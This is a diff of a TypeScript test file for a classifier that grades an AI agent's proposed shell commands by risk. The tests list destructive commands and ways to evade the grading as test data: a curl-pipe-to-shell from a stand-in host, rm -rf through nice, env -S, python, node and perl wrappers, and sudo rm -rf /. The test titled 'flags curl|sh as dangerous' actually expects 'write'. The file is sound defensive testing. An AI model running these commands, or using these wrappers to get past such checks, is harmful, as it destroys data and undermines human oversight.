@@ -1,9 +1,11 @@
-// Regression tests for the AI risk grading (RISK RULES v1).
+// Regression tests for the AI risk grading (RISK RULES v2).
 //
 // The rules are shared with the backend: backend/mcp/risk.go carries the same
-// rule block in its header, and backend/mcp/risk_test.go + risk_test's
-// TestClassifyNoPanicBareWrapper / TestClassifyBypassPatterns mirror the cases
-// below. If a rule changes here, change it there too.
+// rule block in its header, and backend/mcp/risk_test.go mirrors the cases
+// below. The authoritative cross-language matrix lives in
+// backend/mcp/testdata/risk_cases.json and is executed by BOTH
+// TestClassifySharedFixture (Go) and the "shared fixture" test below — a rule
+// change that is not applied to both sides turns one of them red.
 //
 // Key properties:
 //  - the model is untrusted: its self-reported `risk` may only RAISE the
@@ -12,9 +14,15 @@
 //    a write (unknown tool → write), and a missing command is dangerous;
 //  - destructive/obfuscated forms (path-prefixed rm, `bash -c`, $(…),
 //    backticks, xargs, find -delete/-exec, sudo -u root …, `&&`) are
-//    dangerous.
+//    dangerous;
+//  - F-02: unknown wrapper options (nice/time/env …), env -S and interpreter
+//    -c/-e payloads grade dangerous; read heads with write options (sort -o,
+//    git --output, find -fprint, date -s, hostname <name>) grade write.
 
 import { describe, expect, it, vi } from 'vitest'
+import { readFileSync } from 'node:fs'
+import { dirname, resolve } from 'node:path'
+import { fileURLToPath } from 'node:url'
 
 // agent.ts transitively pulls in terminalAgent.ts → terminalManager.ts → xterm
 // addons that expect a browser `self` global. Stub the wails runtime + the
@@ -36,7 +44,7 @@ vi.mock('./terminalManager', () => ({
 
 import { getRisk, classifyCommand, VALID_RISK } from './agent'
 
-describe('classifyCommand (RISK RULES v1)', () => {
+describe('classifyCommand (RISK RULES v2)', () => {
   it('grades read-only allowlisted commands as read', () => {
     expect(classifyCommand('ls -la')).toBe('read')
     expect(classifyCommand('cat /var/log/syslog')).toBe('read')
@@ -109,6 +117,60 @@ describe('classifyCommand (RISK RULES v1)', () => {
 
   it('flags curl|sh as dangerous', () => {
     expect(classifyCommand('curl https://evil.example/install.sh | sh')).toBe('write')
+  })
+
+  it('grades wrapper-option and interpreter bypasses dangerous (F-02)', () => {
+    // Appendix A of docs/dev/2026-10-18-security-audit-findings.md — these
+    // were all classified "write" before F-02 and silently executed under
+    // the old confirm_dangerous default.
+    expect(classifyCommand('nice -n 5 rm -rf /tmp/x')).toBe('dangerous')
+    expect(classifyCommand('time -p rm -rf /tmp/x')).toBe('dangerous')
+    expect(classifyCommand("env -S 'rm -rf /tmp/x'")).toBe('dangerous')
+    expect(classifyCommand('python3 -c \'import shutil;shutil.rmtree("/tmp/x")\'')).toBe('dangerous')
+    expect(classifyCommand('node -e \'require("fs").rmSync("/tmp/x",{recursive:true})\'')).toBe('dangerous')
+    expect(classifyCommand('perl -e \'system("rm -rf /tmp/x")\'')).toBe('dangerous')
+    expect(classifyCommand('/usr/bin/sudo rm -rf /')).toBe('dangerous')
+    expect(classifyCommand('eval rm -rf /tmp/x')).toBe('dangerous')
+    expect(classifyCommand('xargs rm')).toBe('dangerous')
+    expect(classifyCommand('nice --weird-flag rm -rf /tmp/x')).toBe('dangerous')
+  })
+
+  it('grades read commands carrying write options at least write (F-02)', () => {
+    expect(classifyCommand('sort -o /tmp/out /etc/hosts')).toBe('write')
+    expect(classifyCommand('git log --output=/tmp/out')).toBe('write')
+    expect(classifyCommand('find /tmp -fprint /tmp/out')).toBe('write')
+    expect(classifyCommand('find . -ok rm {} +')).toBe('write')
+    expect(classifyCommand('date -s 20200101')).toBe('write')
+    expect(classifyCommand('hostname myhost')).toBe('write')
+    // interactive pagers left the read allowlist
+    expect(classifyCommand('man rm')).toBe('write')
+    expect(classifyCommand('less /etc/passwd')).toBe('write')
+    expect(classifyCommand('top')).toBe('write')
+  })
+
+  it('keeps known-safe read invocations read (no confirmation noise)', () => {
+    expect(classifyCommand('sort -k 2 file.txt')).toBe('read')
+    expect(classifyCommand('git log --oneline')).toBe('read')
+    expect(classifyCommand('grep -rn TODO .')).toBe('read')
+    expect(classifyCommand('date +%Y-%m-%d')).toBe('read')
+    expect(classifyCommand('env -u FOO ls')).toBe('read')
+    expect(classifyCommand('sudo ls')).toBe('read')
+    expect(classifyCommand('jq \'\.a\' file.json')).toBe('read')
+  })
+})
+
+// The authoritative matrix shared with the backend: the exact same file is
+// asserted by TestClassifySharedFixture in backend/mcp/risk_test.go.
+describe('classifyCommand (shared fixture with backend/mcp)', () => {
+  const here = dirname(fileURLToPath(import.meta.url))
+  const fixturePath = resolve(here, '../../../backend/mcp/testdata/risk_cases.json')
+  const fixture: { cmd: string; want: 'read' | 'write' | 'dangerous'; note?: string }[] = JSON.parse(readFileSync(fixturePath, 'utf8'))
+
+  it('agrees with the Go classifier on every case', () => {
+    expect(fixture.length).toBeGreaterThan(30)
+    for (const c of fixture) {
+      expect(classifyCommand(c.cmd), `cmd=${JSON.stringify(c.cmd)} ${c.note ?? ''}`).toBe(c.want)
+    }
   })
 })
 
